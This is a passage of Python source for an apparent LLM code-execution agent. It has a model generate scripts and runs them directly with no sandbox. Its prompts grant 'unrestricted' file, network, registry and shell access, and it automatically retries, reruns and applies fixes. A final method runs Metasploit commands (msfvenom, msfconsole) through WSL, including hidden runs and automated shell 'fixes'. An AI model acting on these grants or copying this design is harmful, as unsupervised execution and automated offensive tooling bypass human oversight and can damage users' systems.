        timeout: int = 30,
    ) -> Generator[str, None, None]:
        """
        Execute script with stdin support for interactive programs.

        Detects input() calls and generates test inputs automatically.

        Args:
            script_path: Path to the script to execute
            timeout: Execution timeout in seconds

        Yields:
            Output lines as they arrive
        """
        logger.info(f"Executing with input support: {script_path}")

        # Read code and detect input calls
        code = script_path.read_text()
        input_count, prompts = detect_input_calls(code)

        if input_count == 0:
            # No input calls, use regular execution
            yield from self.stream_execution(script_path, timeout)
            return

        logger.info(f"Detected {input_count} input() call(s), generating test inputs")

        # Generate test inputs
        test_inputs = generate_test_inputs(prompts)
        logger.info(f"Generated test inputs: {test_inputs}")

        try:
            # Windows-specific subprocess creation
            creation_flags = 0
            if sys.platform == "win32":
                creation_flags = subprocess.CREATE_NEW_PROCESS_GROUP

            # Use Popen for stdin support
            process = subprocess.Popen(
                [sys.executable, str(script_path)],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                creationflags=creation_flags,
            )

            assert process.stdin is not None
            assert process.stdout is not None

            # Send all inputs joined with newlines
            input_data = "\n".join(test_inputs) + "\n"
            process.stdin.write(input_data)
            process.stdin.flush()

            # Read output in real-time
            while True:
                line = process.stdout.readline()
                if not line and process.poll() is not None:
                    break

                if line:
                    yield line
                    logger.debug(f"stdout: {line.rstrip()}")

            # Get exit code
            exit_code = process.wait(timeout=5)
            logger.info(f"Process exited with code {exit_code}")

            if exit_code != 0:
                yield f"\n❌ Script failed with exit code {exit_code}\n"

        except subprocess.TimeoutExpired:
            logger.warning(f"Script execution timeout after {timeout}s")
            yield f"\n❌ Error: Execution timed out after {timeout} seconds"
        except Exception as e:
            logger.error(f"Failed to execute script: {e}")
            error_msg = f"{type(e).__name__}: {str(e)}\n{traceback.format_exc()}"
            yield f"\n❌ Error: {error_msg}"

    def stream_execution(self, script_path: Path, timeout: int = 30) -> Generator[str, None, None]:
        """
        Execute script and stream output.

        Uses subprocess.run() for Windows compatibility, avoiding WinError 10038.

        Args:
            script_path: Path to the script to execute
            timeout: Execution timeout in seconds

        Yields:
            Output lines as they arrive (after completion)
        """
        logger.info(f"Streaming execution of {script_path}")

        try:
            # Windows-specific subprocess creation
            creation_flags = 0
            if sys.platform == "win32":
                creation_flags = subprocess.CREATE_NEW_PROCESS_GROUP

            # Use subprocess.run() instead of Popen for better Windows compatibility
            process = subprocess.run(
                [sys.executable, str(script_path)],
                capture_output=True,
                text=True,
                timeout=timeout,
                creationflags=creation_flags,
            )

            # Yield stdout line by line
            if process.stdout:
                for line in process.stdout.splitlines(keepends=True):
                    logger.debug(f"STDOUT: {line.rstrip()}")
                    yield line

            # Yield stderr line by line
            if process.stderr:
                for line in process.stderr.splitlines(keepends=True):
                    logger.debug(f"STDERR: {line.rstrip()}")
                    yield line

            # Check exit code
            exit_code = process.returncode
            logger.info(f"Process exited with code {exit_code}")

            if exit_code != 0:
                logger.warning(f"Script failed with exit code {exit_code}")

        except subprocess.TimeoutExpired:
            logger.warning(f"Script execution timeout after {timeout}s")
            yield f"\n❌ Error: Execution timed out after {timeout} seconds"
        except Exception as e:
            logger.error(f"Failed to stream execution: {e}")
            error_msg = f"{type(e).__name__}: {str(e)}\n{traceback.format_exc()}"
            yield f"\n❌ Error: {error_msg}"

    def execute_request(
        self,
        user_request: str,
        language: str = "python",
        timeout: int = 30,
        max_attempts: Optional[int] = None,
    ) -> Generator[str, None, None]:
        """Execute a user request end-to-end with direct execution (no sandbox).

        Smart retry behavior (max 3-5 attempts):
        - Retries only on actual code generation errors (syntax, logic)
        - Skips retry for permission/privilege errors
        - Skips retry for environment setup (installs packages and runs again)
        - Limits retries to prevent infinite loops
        """

        logger.info(f"Executing request with direct execution: {user_request}")

        if max_attempts is None:
            parsed = parse_retry_limit(user_request)
            max_attempts = parsed if parsed is not None else 5

        # Cap maximum attempts to prevent infinite loops
        max_attempts = min(max_attempts, 5)

        retry_manager = IntelligentRetryManager(max_retries=max_attempts, error_repeat_threshold=3)

        code: Optional[str] = None
        last_error_output = ""
        desktop_path: Optional[Path] = None
        target_filename = self._generate_safe_filename(user_request) + ".py"

        while True:
            decision = retry_manager.should_retry()
            if not decision.should_retry:
                reason = decision.reason or "retry budget exhausted"
                yield f"\n❌ Stopping retries: {reason}\n"
                if last_error_output:
                    yield f"Last error:\n{last_error_output}\n"
                return

            attempt = retry_manager.next_attempt()
            progress = format_attempt_progress(attempt, max_attempts)

            try:
                if attempt == 1:
                    yield f"📝 Generating code... ({progress})\n"
                    code = self.generate_code(
                        user_request, language, target_filename=target_filename
                    )
                else:
                    yield f"📝 Fixing code... ({progress})\n"
                    code = self._generate_fix_code(
                        user_request=user_request,
                        previous_code=code or "",
                        error_output=last_error_output,
                        language=language,
                        attempt=attempt,
                    )

                yield "   ✓ Code generated\n\n"

                # Apply Smart Input Detection & Injection
                input_handler = SmartInputHandler()
                code, test_inputs = input_handler.detect_and_inject_inputs(code)
                if test_inputs:
                    yield f"🧠 Smart Input: Auto-injecting {len(test_inputs)} test values\n"
                    code = input_handler.inject_test_inputs(code, test_inputs)

                # Detect if code has input() calls (in case some were not handled by smart injector)
                has_interactive = has_input_calls(code)
                input_count, prompts = detect_input_calls(code)

                if has_interactive:
                    yield f"🔍 Detected {input_count} input() call(s)\n"

                # Validate code before execution
                yield "🔍 Validating code for common issues...\n"
                validation_result = self.code_validator.validate(code)

                # Show what was checked
                if validation_result.checks_performed:
                    checks = ", ".join(validation_result.checks_performed)
                    yield f"   ✓ Checks performed: {checks}\n"

                # Handle validation issues
                if validation_result.issues:
                    # Show warnings (non-blocking)
                    warnings = validation_result.get_warning_messages()
                    if warnings:
                        for warning in warnings:
                            yield f"   ⚠️ Warning: {warning}\n"

                    # Show errors (blocking)
                    errors = validation_result.get_error_messages()
                    if errors:
                        yield f"\n❌ Validation found {len(errors)} critical issue(s):\n"
                        for error in errors:
                            yield f"   • {error}\n"

                        # Attempt ONE fix for the first error
                        if attempt == 1:
                            yield "\n🔧 Attempting automatic fix...\n"
                            first_error = next(
                                (
                                    issue
                                    for issue in validation_result.issues
                                    if issue.severity == "error"
                                ),
                                None,
                            )
                            if first_error:
                                fixed_code = self.code_validator.suggest_fix(code, first_error)
                                if fixed_code:
                                    code = fixed_code
                                    yield f"   ✓ Applied fix: {first_error.suggestion}\n"
                                    yield "   ↻ Re-validating fixed code...\n"
                                    # Re-validate
                                    validation_result = self.code_validator.validate(code)
                                    if validation_result.has_errors():
                                        yield "   ❌ Fix did not resolve all issues\n"
                                        last_error_output = "\n".join(
                                            validation_result.get_error_messages()
                                        )
                                        retry_manager.register_failure(last_error_output)
                                        continue
                                    else:
                                        yield "   ✓ Code validation passed after fix\n\n"
                                else:
                                    yield "   ⚠️ No automatic fix available\n"
                                    yield "   ❌ Aborting execution due to validation errors\n"
                                    last_error_output = "\n".join(errors)
                                    return
                        else:
                            # Already tried fixing, abort
                            yield "\n❌ Code still has validation errors after fix attempt\n"
                            yield "   Aborting to prevent timeout/hang\n"
                            last_error_output = "\n".join(errors)
                            return
                else:
                    yield "   ✓ Validation passed - no issues found\n\n"

                # Save to Desktop first
                yield "💾 Saving code to Desktop...\n"
                try:
                    desktop_path = self.save_code_to_desktop(
                        code, user_request, filename=target_filename
                    )
                    yield f"   ✓ Saved to: {desktop_path}\n\n"
                except Exception as e:
                    yield f"   ⚠️ Could not save to Desktop: {e}\n"
                    # Continue with execution anyway

                # Execute code directly with full system access
                yield "🚀 Executing code directly (no sandbox restrictions)...\n"

                # Check for common environment/setup errors that don't need retries
                if last_error_output:
                    if any(
                        err in last_error_output.lower()
                        for err in [
                            "permission denied",
                            "access is denied",
                            "admin",
                            "privilege",
                            "not enough storage",
                            "disk space",
                        ]
                    ):
                        yield "⚠️ Permission/environment error detected\n"
                        yield "💡 Note: Some operations may require admin privileges\n"
                        # Continue with execution anyway

                # Use DirectCodeRunner for unrestricted execution
                exit_code, stdout, stderr = self.direct_runner.run_direct_code(
                    code=code, script_path=desktop_path, timeout=timeout, capture_output=True
                )

                # Stream the captured output
                if stdout:
                    for line in stdout.splitlines():
                        yield f"📤 {line}\n"
                if stderr:
                    for line in stderr.splitlines():
                        yield f"⚠️ {line}\n"

                # Check execution result
                if exit_code == 0:
                    yield "✅ Code executed successfully!\n\n"

                    # After execution completes, extract file locations and save metadata
                    yield "\n"

                    # Extract actual file locations (Desktop paths)
                    file_locations = self._extract_file_locations(
                        user_request, desktop_path, target_filename
                    )

                    # Save execution metadata (simplified - no sandbox verification needed)
                    execution_metadata = {
                        "timestamp": datetime.now().isoformat(),
                        "prompt": user_request,
                        "filename": target_filename,
                        "desktop_path": str(desktop_path) if desktop_path else None,
                        "code": code,
                        "execution_status": "success",
                        "attempts": attempt,
                        "last_error": None,
                        "file_locations": file_locations,
                        "execution_mode": "direct",  # Mark as direct execution
                    }

                    # Save to memory if available
                    if self.memory_module:
                        try:
                            self._save_execution_to_memory(
                                user_request, code, desktop_path, None, False  # No sandbox result
                            )
                        except Exception as e:
                            logger.warning(f"Failed to save to memory: {e}")

                    yield "🎉 Code successfully executed and exported!\n"
                    return
                else:
                    # Execution failed
                    last_error_output = f"Exit code {exit_code}\n{stdout}\n{stderr}"
                    yield f"❌ Execution failed (attempt {attempt})\n"

                    # Smart error classification for retry logic
                    error_lower = last_error_output.lower()

                    # Skip retry for permission/privilege errors
                    if any(
                        err in error_lower
                        for err in [
                            "permission denied",
                            "access is denied",
                            "admin",
                            "privilege",
                            "not enough storage",
                            "disk space",
                            "cannot write to",
                        ]
                    ):
                        yield f"⚠️ Permission/environment error - not retrying\n"
                        yield f"Error: {last_error_output[:200]}\n"
                        return

                    # Skip retry for environment setup (missing packages will be auto-installed)
                    if any(
                        err in error_lower
                        for err in ["no module named", "import error", "module not found"]
                    ):
                        yield "🔧 Environment setup issue - will auto-install packages on next attempt\n\n"
                        # Continue to next attempt which will auto-install packages
                    else:
                        # Actual code error - continue with retry
                        yield f"Error details: {last_error_output[:300]}\n\n"

            except Exception as e:
                logger.error(f"Failed to execute request: {e}")
                last_error_output = f"Execution error: {str(e)}\n{traceback.format_exc()}"
                yield f"❌ Execution error: {str(e)}\n\n"

        # This should never be reached, but just in case
        yield "❌ Maximum attempts exceeded\n"

    def _save_execution_to_memory(
        self,
        user_request: str,
        code: str,
        desktop_path: Optional[Path],
        result,  # No longer used, kept for compatibility
        is_gui: bool,
    ) -> None:
        """
        Save execution details to persistent memory.

        Args:
            user_request: Original user request
            code: Generated code
            desktop_path: Path where code was saved
            result: No longer used (sandbox result) - kept for compatibility
            is_gui: Whether this was a GUI program
        """
        if not self.memory_module:
            return

        try:
            file_locations = []
            if desktop_path:
                file_locations.append(str(desktop_path))

            # Add Desktop path if it exists and was successfully created
            if desktop_path and Path(desktop_path).exists():
                file_locations.append(str(desktop_path))

            # Also check for other files that might have been created
            desktop = Path.home() / "Desktop"
            if desktop.exists():
                # Look for spectral files on Desktop
                for file_path in desktop.iterdir():
                    if file_path.is_file() and "spectral" in file_path.name.lower():
                        if str(file_path) not in file_locations:
                            file_locations.append(str(file_path))

            # Generate description
            description = self._generate_description(user_request, code)
            tags = ["python", "direct_execution"]
            if is_gui:
                tags.append("gui")
            else:
                tags.append("cli")

            execution_id = self.memory_module.save_execution(
                user_request=user_request,
                description=description,
                code_generated=code,
                file_locations=file_locations,
                output="Direct execution completed successfully",
                success=True,
                tags=tags,
            )

            logger.info(f"Saved direct execution to memory: {execution_id}")

        except Exception as e:
            logger.error(f"Failed to save execution to memory: {e}")

    def _run_script_with_input_support(self, script_path: Path, timeout: int) -> tuple[int, str]:
        """
        Run a script with stdin support for interactive programs.

        Args:
            script_path: Path to the script
            timeout: Execution timeout

        Returns:
            Tuple of (exit_code, combined_output)
        """
        code = script_path.read_text()
        input_count, prompts = detect_input_calls(code)

        if input_count == 0:
            # No input calls, use regular execution
            return self._run_script_capture(script_path, timeout)

        # Generate test inputs
        test_inputs = generate_test_inputs(prompts)

        creation_flags = 0
        if sys.platform == "win32":
            creation_flags = subprocess.CREATE_NEW_PROCESS_GROUP

        try:
            process = subprocess.Popen(
                [sys.executable, str(script_path)],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                creationflags=creation_flags,
            )

            # Send all inputs
            input_data = "\n".join(test_inputs) + "\n"
            stdout, _ = process.communicate(input=input_data, timeout=timeout)

            return process.returncode, stdout
        except subprocess.TimeoutExpired:
            return 124, f"Execution timed out after {timeout} seconds"
        except Exception as e:
            return 1, str(e)

    def _run_script_capture(self, script_path: Path, timeout: int) -> tuple[int, str]:
        """Run a script and capture its combined output."""

        creation_flags = 0
        if sys.platform == "win32":
            creation_flags = subprocess.CREATE_NEW_PROCESS_GROUP

        result = subprocess.run(
            [sys.executable, str(script_path)],
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,
            creationflags=creation_flags,
        )

        combined_output = (result.stdout or "") + (result.stderr or "")
        return result.returncode, combined_output

    def _detect_desktop_save_request(self, user_request: str) -> bool:
        """Detect if user wants to save to desktop."""
        patterns = [
            r"save\s+(?:it|them|the\s+file|to\s+desktop)",
            r"(?:on|to)\s+desktop",
            r"desktop\s+(?:folder|directory)",
        ]
        return any(re.search(pattern, user_request.lower()) for pattern in patterns)

    def _modify_for_desktop_save(self, code: str, user_request: str) -> str:
        """Modify code to save to desktop if requested."""
        import re

        desktop_pattern = re.compile(r"['\"]\s*\.\s*['\"]|['\"][^'\"]*['\"]")

        # Check if there's a file open/write operation
        if desktop_pattern.search(code):
            # Replace with desktop path
            desktop_path = str(Path.home() / "Desktop")
            code = re.sub(
                r"(['\"])(\.\s*|desktop)(['\"])",
                rf"\1{desktop_path}\3",
                code,
                flags=re.IGNORECASE,
            )
        return code

    def _extract_file_locations(
        self,
        user_request: str,
        desktop_path: Optional[Path],
        filename: str,
    ) -> List[str]:
        """
        Extract actual file locations from Desktop and other locations.

        Args:
            user_request: Original user request for filename extraction
            desktop_path: Path to file on Desktop if saved
            filename: Target filename

        Returns:
            List of file paths where files were created
        """
        file_locations: List[str] = []

        # Add Desktop path if it exists
        if desktop_path and Path(desktop_path).exists():
            file_locations.append(str(desktop_path))

        # Also check Desktop for files matching the prompt pattern
        desktop = Path.home() / "Desktop"

        # Generate expected filename from user request
        expected_base = self._generate_safe_filename(user_request)

        if desktop.exists():
            # Look for matching files on Desktop
            for file_path in desktop.iterdir():
                if file_path.is_file():
                    # Check if it matches the expected pattern
                    file_name_lower = file_path.name.lower()
                    expected_lower = expected_base.lower()

                    # Check for spectral_* pattern or exact match
                    if (
                        file_name_lower.startswith("spectral_")
                        or file_name_lower.startswith(expected_lower)
                        or file_name_lower.replace("_", "").startswith(
                            expected_lower.replace("_", "")
                        )
                    ):
                        # Verify it's a Python file or matches the target filename
                        if file_path.suffix == ".py" or filename in file_path.name:
                            if str(file_path) not in file_locations:
                                file_locations.append(str(file_path))

        return file_locations

    def _generate_fix_code(
        self,
        user_request: str,
        previous_code: str,
        error_output: str,
        language: str,
        attempt: int,
    ) -> str:
        """
        Generate fixed code based on error output.

        Args:
            user_request: Original user request
            previous_code: Code that failed
            error_output: Error message/output
            language: Programming language
            attempt: Current attempt number

        Returns:
            Fixed code
        """
        import getpass

        username = getpass.getuser()

        # Check if error is from test failures
        is_test_failure = "GUI Tests Failed" in error_output or "FAILED" in error_output

        if is_test_failure:
            prompt = f"""{AUTONOMOUS_CODE_REQUIREMENT}

═══════════════════════════════════════════════════════════════════════════════
🔧 CODE FIX REQUEST - GUI Test Failures
═══════════════════════════════════════════════════════════════════════════════

Original Request: {user_request}
Attempt: {attempt}
Language: {language}

TEST RESULTS (What went wrong):
{error_output[:1500]}

PREVIOUS CODE (That failed):
```python
{previous_code[:1500]}
```

═══════════════════════════════════════════════════════════════════════════════
🎯 YOUR TASK: Generate WORKING, TESTED code
═══════════════════════════════════════════════════════════════════════════════

The automated tests verify:
✓ Program initialization succeeds
✓ UI elements are created properly
✓ Event handlers work correctly
✓ State changes happen as expected
✓ Randomization/variety functions properly

You have FULL SYSTEM ACCESS. Generate COMPLETE, WORKING code that:

1. FIXES THE ROOT CAUSE:
   - Analyze the exact test failure
   - Identify what's missing or broken
   - Fix it completely, not partially

2. ENSURES COMPLETENESS:
   - All UI elements properly created and accessible
   - Event handlers connected and functional
   - State management works correctly
   - Variety/randomization implemented (if needed)
   - Code can be tested programmatically

3. MAINTAINS QUALITY:
   - Proper error handling with try/except
   - Clear comments explaining the fix
   - Hard-coded test inputs (NO input() calls)
   - Follows GUI best practices
   - Desktop save location: C:\\Users\\{username}\\Desktop

4. VERIFICATION:
   Before returning, verify:
   ✓ All test requirements are addressed
   ✓ No infinite loops or blocking calls
   ✓ Proper timeouts on async operations
   ✓ All imports are correct
   ✓ Code is immediately executable

═══════════════════════════════════════════════════════════════════════════════
📤 OUTPUT FORMAT
═══════════════════════════════════════════════════════════════════════════════

Return ONLY the complete fixed Python code wrapped in a single code block:

```python
# complete fixed code
```

Rules:
- Exactly ONE ```python ... ``` block
- No text before or after
- No explanations outside the code
- Code must work on first execution"""
        else:
            prompt = f"""{AUTONOMOUS_CODE_REQUIREMENT}

═══════════════════════════════════════════════════════════════════════════════
🔧 CODE FIX REQUEST - Execution Error
═══════════════════════════════════════════════════════════════════════════════

Original Request: {user_request}
Attempt: {attempt}
Language: {language}

ERROR OUTPUT (What went wrong):
{error_output[:1000]}

PREVIOUS CODE (That failed):
```python
{previous_code[:1000]}
```

═══════════════════════════════════════════════════════════════════════════════
🎯 YOUR TASK: Generate WORKING code
═══════════════════════════════════════════════════════════════════════════════

You have FULL SYSTEM ACCESS. Analyze the error and generate COMPLETE, WORKING code:

1. FIX THE ERROR:
   - Identify the root cause (syntax, logic, import, runtime)
   - Fix it properly, not with workarounds
   - Ensure the fix doesn't break other parts

2. IMPROVE ROBUSTNESS:
   - Add proper error handling (try/except blocks)
   - Include timeouts for I/O operations
   - Handle edge cases that caused failure
   - Add logging/debug prints

3. MAINTAIN FUNCTIONALITY:
   - Keep the original intent
   - Implement ALL required features
   - Use hard-coded test values (NO input() calls)
   - Save files to: C:\\Users\\{username}\\Desktop

4. COMMON ERROR FIXES:

   ImportError/ModuleNotFoundError:
   - Check import spelling
   - Use correct package names
   - Packages will be auto-installed

   SyntaxError:
   - Fix indentation
   - Check for unclosed brackets/quotes
   - Verify proper Python syntax

   RuntimeError/TypeError:
   - Check variable types
   - Add type conversions
   - Verify function signatures

   TimeoutError:
   - Add socket.settimeout() for networking
   - Use requests with timeout parameter
   - Add thread.join(timeout=30)

   FileNotFoundError:
   - Check paths use Windows format
   - Verify files exist before reading
   - Use pathlib.Path for paths

5. VERIFICATION CHECKLIST:
   Before returning, verify:
   ✓ Error is completely fixed
   ✓ All imports are correct
   ✓ No infinite loops
   ✓ Proper error handling
   ✓ Timeouts where needed
   ✓ Code is complete and runnable

═══════════════════════════════════════════════════════════════════════════════
📤 OUTPUT FORMAT
═══════════════════════════════════════════════════════════════════════════════

Return ONLY the complete fixed Python code wrapped in a single code block:

```python
# complete fixed code
```

Rules:
- Exactly ONE ```python ... ``` block
- No text before or after
- No explanations outside the code
- Code must work on first execution"""

        try:
            code = self.llm_client.generate(prompt)
            cleaned_code = clean_code(str(code))
            logger.debug(f"Generated fix for attempt {attempt}")
            return str(cleaned_code)
        except Exception as e:
            logger.error(f"Failed to generate fix code: {e}")
            raise

    def _generate_filename(self, filename_base: str) -> str:
        """Generate a filename with timestamp."""
        import time

        # Add timestamp
        timestamp = int(time.time())
        return f"{filename_base}_{timestamp}.py"

    def _build_code_generation_prompt(
        self, user_request: str, language: str, learned_patterns: Optional[list] = None
    ) -> str:
        """
        Build prompt for code generation with learned patterns.

        Args:
            user_request: User's natural language request
            language: Programming language
            learned_patterns: List of learned patterns to apply

        Returns:
            Formatted prompt string
        """
        import getpass

        username = getpass.getuser()

        prompt = f"""{AUTONOMOUS_CODE_REQUIREMENT}

Task: Write a {language} script that does the following:
{user_request}

═══════════════════════════════════════════════════════════════════════════════
🔓 FULL SYSTEM ACCESS AVAILABLE
═══════════════════════════════════════════════════════════════════════════════

You have COMPLETE, UNRESTRICTED access to the user's system:

✅ FILESYSTEM ACCESS:
   - Read/write ANY files in ANY directory
   - Access user's entire filesystem (C:\\Users\\{username}\\)
   - Create/modify/delete files and directories

✅ NETWORK ACCESS:
   - Create raw socket connections
   - Make HTTP/HTTPS requests
   - Connect to any IP/port without restrictions
   - Use websockets, FTP, SSH, etc.

✅ SYSTEM COMMANDS:
   - Execute subprocess commands
   - Run PowerShell scripts
   - Use os.system(), subprocess.run(), etc.
   - Access system utilities and tools

✅ PACKAGE INSTALLATION:
   - ANY missing packages will be auto-installed via pip
   - Use numpy, pandas, requests, pillow, opencv, etc. freely
   - No package restrictions whatsoever

✅ OS FEATURES:
   - Environment variables
   - System registry (Windows)
   - Process management
   - Thread/async operations

═══════════════════════════════════════════════════════════════════════════════
📋 CODE GENERATION REQUIREMENTS
═══════════════════════════════════════════════════════════════════════════════

Generate COMPLETE, WORKING code that will execute successfully on first try.

1. COMPLETENESS:
   - Write FULL implementation, not pseudo-code or partial solutions
   - Include ALL necessary imports at the top
   - Implement ALL functions and classes completely
   - No TODO comments or placeholder functions
   - Code must be immediately executable

2. IMPORTS & DEPENDENCIES:
   - Import ALL required modules (they'll be auto-installed if missing)
   - Prefer standard library when possible: os, sys, json, re, pathlib, subprocess
   - Use external packages when appropriate: requests, pillow, numpy, pandas
   - Verify imports are spelled correctly

3. ERROR HANDLING:
   - Wrap risky operations in try/except blocks
   - Handle file not found, network errors, permission errors
   - Log errors with clear messages
   - Include retry logic for network operations (with timeouts)

4. AUTONOMY (CRITICAL):
   - Hard-code ALL input values - NO input() calls ever
   - For test data: use realistic hardcoded examples
   - No interactive prompts or user input required
   - Code must run completely unattended

5. OUTPUT & LOGGING:
   - Print progress messages during execution
   - Show results immediately
   - Save files to Desktop: C:\\Users\\{username}\\Desktop
   - Log what the code is doing

6. TASK-SPECIFIC BEST PRACTICES:

   THREADING/ASYNC:
   - Set timeouts on thread.join() and async operations
   - Include proper shutdown handlers
   - Clean up resources in finally blocks
   - Use threading.Event() or asyncio.wait_for() with timeouts

   NETWORKING:
   - ALWAYS set socket timeouts: sock.settimeout(30)
   - Include error handling for connection failures
   - Use requests library with timeout parameter: requests.get(url, timeout=10)
   - Log all network activity

   FILE I/O:
   - Use pathlib.Path for cross-platform paths
   - Always use 'with' context managers for file operations
   - Check if files exist before reading: Path(file).exists()
   - Handle permission errors gracefully

   SYSTEM CALLS:
   - Use subprocess.run() with timeout parameter
   - Capture output with capture_output=True
   - Handle errors with proper exception catching
   - Use shell=True only when necessary

═══════════════════════════════════════════════════════════════════════════════
🔍 PRE-GENERATION VERIFICATION CHECKLIST
═══════════════════════════════════════════════════════════════════════════════

Before returning code, verify:
✓ All imports are standard library or common packages (will be auto-installed)
✓ All function calls have proper error handling (try/except)
✓ All loops have clear exit conditions (no infinite loops)
✓ All I/O operations have timeouts where applicable (sockets, requests, threads)
✓ Code is complete and immediately runnable (not pseudo-code)
✓ No input() calls or interactive prompts
✓ All test values are hardcoded
✓ File paths use Windows format or pathlib

═══════════════════════════════════════════════════════════════════════════════
🖥️ WINDOWS ENVIRONMENT DETAILS
═══════════════════════════════════════════════════════════════════════════════

- Home directory: C:\\Users\\{username}
- Desktop: C:\\Users\\{username}\\Desktop  
- Temp: C:\\Users\\{username}\\AppData\\Local\\Temp
- Documents: C:\\Users\\{username}\\Documents

Path handling:
- Use pathlib.Path for cross-platform compatibility
- Or use raw strings: r'C:\\path\\to\\file'
- Or double backslashes: 'C:\\\\path\\\\to\\\\file'
- Use os.path.expanduser('~') for home directory
- Use os.path.join() or Path() for path construction

═══════════════════════════════════════════════════════════════════════════════
🎯 EXECUTION CONTEXT
═══════════════════════════════════════════════════════════════════════════════

Your code will be:
1. Executed IMMEDIATELY after generation
2. Run with the user's Python interpreter (full system access)
3. Given 30 seconds to complete (unless it's a long-running service)
4. Tested with the hardcoded values you provide

Generate code that works on FIRST execution, not code that needs debugging.

═══════════════════════════════════════════════════════════════════════════════
📤 OUTPUT FORMAT
═══════════════════════════════════════════════════════════════════════════════

Return ONLY valid Python code wrapped in a SINGLE Python code block.

REQUIRED output shape:
```python
# your complete, runnable code here
```

Rules:
- Exactly ONE ```python ... ``` block
- No text before or after the code block
- No explanations, no pseudocode
- Code must be immediately executable as-is"""

        # Inject learned patterns
        if learned_patterns:
            prompt += "\n\n═══════════════════════════════════════════════════════════════════════════════\n"
            prompt += "📚 LEARNED PATTERNS (Apply these to avoid past mistakes)\n"
            prompt += "═══════════════════════════════════════════════════════════════════════════════\n\n"
            for i, pattern in enumerate(learned_patterns[:5], 1):
                prompt += f"{i}. {pattern.get('error_type')}: {pattern.get('fix_applied')}\n"

        return prompt

    def _generate_description(self, user_request: str, code: str) -> str:
        """
        Generate a semantic description for an execution.

        Args:
            user_request: Original user request
            code: Generated code

        Returns:
            Semantic description
        """
        # Extract key concepts from user request
        request_lower = user_request.lower()

        if "file" in request_lower or "count" in request_lower:
            return f"File {user_request}"

        if "web" in request_lower or "scrape" in request_lower or "download" in request_lower:
            return "Web scraper"

        if "api" in request_lower:
            return "API client"

        if "data" in request_lower or "process" in request_lower:
            return "Data processing script"

        if "gui" in request_lower or "window" in request_lower or "interface" in request_lower:
            return "GUI application"

        if "sort" in request_lower or "filter" in request_lower:
            return "Data manipulation script"

        if "convert" in request_lower or "transform" in request_lower:
            return "Data conversion script"

        if "backup" in request_lower or "copy" in request_lower:
            return "File backup script"

        # Default description
        return f"Python script: {user_request[:50]}"

    def _convert_windows_path_to_wsl(self, windows_path: str) -> str:
        r"""
        Convert Windows path to WSL format.

        Examples:
            C:\Users\aubrey martin\Desktop\payload.exe
            → /mnt/c/Users/aubrey martin/Desktop/payload.exe

        Args:
            windows_path: Windows-style path

        Returns:
            WSL-style path
        """
        if not windows_path or windows_path.startswith("/"):
            return windows_path

        # Convert C:\ to /mnt/c/
        import re

        # Match drive letter (C:, D:, etc.)
        match = re.match(r"([A-Za-z]):\\", windows_path)
        if match:
            drive = match.group(1).lower()
            rest = windows_path[3:]  # Remove "C:\"
            # Replace backslashes with forward slashes
            rest = rest.replace("\\", "/")
            # Escape spaces
            rest = rest.replace(" ", "\\ ")
            wsl_path = f"/mnt/{drive}/{rest}"
            return wsl_path

        return windows_path

    def execute_metasploit_command(
        self,
        command: str,
        show_terminal: bool = True,
        timeout: int = 60,
        auto_fix: bool = True,
    ) -> tuple[int, str]:
        """
        Execute a Metasploit command via WSL with visible terminal output.

        Args:
            command: Metasploit command to execute (msfvenom, msfconsole, etc.)
            show_terminal: Whether to show terminal window (default True)
            timeout: Command timeout in seconds
            auto_fix: Whether to attempt autonomous fixes for common errors

        Returns:
            Tuple of (exit_code, output_string)
        """
        from spectral.knowledge import diagnose_error

        # Prepend 'wsl' to route command to Ubuntu/WSL
        if not command.startswith("wsl "):
            command = f"wsl {command}"

        logger.info(
            f"Executing Metasploit command via WSL (visible={show_terminal}): {command[:100]}"
        )

        # Emit GUI event for command start
        self._emit_gui_event(
            "command_start",
            {"command": command, "show_terminal": show_terminal, "type": "metasploit"},
        )

        try:
            # Execute the command
            if show_terminal:
                # Show terminal window so user can see execution
                # Use 'cmd /k' to keep window open after command completes
                full_command = f"cmd /k {command}"

                if sys.platform == "win32":
                    result = subprocess.Popen(
                        full_command,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True,
                    )
                    stdout, stderr = result.communicate(
                        timeout=300
                    )  # 5 minute timeout with visible window
                    exit_code = result.returncode
                    output = stdout + stderr
                else:
                    result = subprocess.run(
                        command,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=timeout,
                    )
                    exit_code = result.returncode
                    output = (result.stdout or "") + (result.stderr or "")
            else:
                # Hidden execution
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                )
                exit_code = result.returncode
                output = (result.stdout or "") + (result.stderr or "")

            logger.debug(f"Command exit code: {exit_code}")
            logger.debug(f"Command output: {output[:500]}")

            # Check for errors and attempt autonomous fixes
            if auto_fix and exit_code != 0:
                # Emit GUI event for error
                self._emit_gui_event(
                    "command_error",
                    {"command": command, "error": output, "exit_code": exit_code},
                )

                # Diagnose the error
                diagnosis, fixes = diagnose_error(output)

                logger.info(f"Metasploit error diagnosed: {diagnosis}")
                logger.info(f"Suggested fixes: {fixes}")

                # Try autonomous fixes
                for fix in fixes:
                    logger.info(f"Attempting autonomous fix: {fix}")

                    # Execute the fix command
                    fix_result = subprocess.run(
                        fix,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=30,
                    )

                    if fix_result.returncode == 0:
                        logger.info(f"Autonomous fix succeeded: {fix}")
                        # Retry original command
                        retry_result = subprocess.run(
                            command,
                            shell=True,
                            capture_output=True,
                            text=True,
                            timeout=timeout,
                        )
                        output = (retry_result.stdout or "") + (retry_result.stderr or "")
                        exit_code = retry_result.returncode

                        if retry_result.returncode == 0:
                            break
                    else:
                        logger.warning(f"Autonomous fix failed: {fix}")

            # Emit GUI event for command completion
            self._emit_gui_event(
                "command_complete",
                {
                    "command": command,
                    "exit_code": exit_code,
                    "output": output,
                },
            )

            return exit_code, output

        except subprocess.TimeoutExpired:
            error_msg = f"Metasploit command timed out after {timeout} seconds"
            logger.error(error_msg)
            self._emit_gui_event("command_timeout", {"command": command, "timeout": timeout})
            return 124, error_msg
        except Exception as e:
            error_msg = f"Error executing Metasploit command: {str(e)}"
            logger.exception(error_msg)
            self._emit_gui_event("command_error", {"command": command, "error": error_msg})
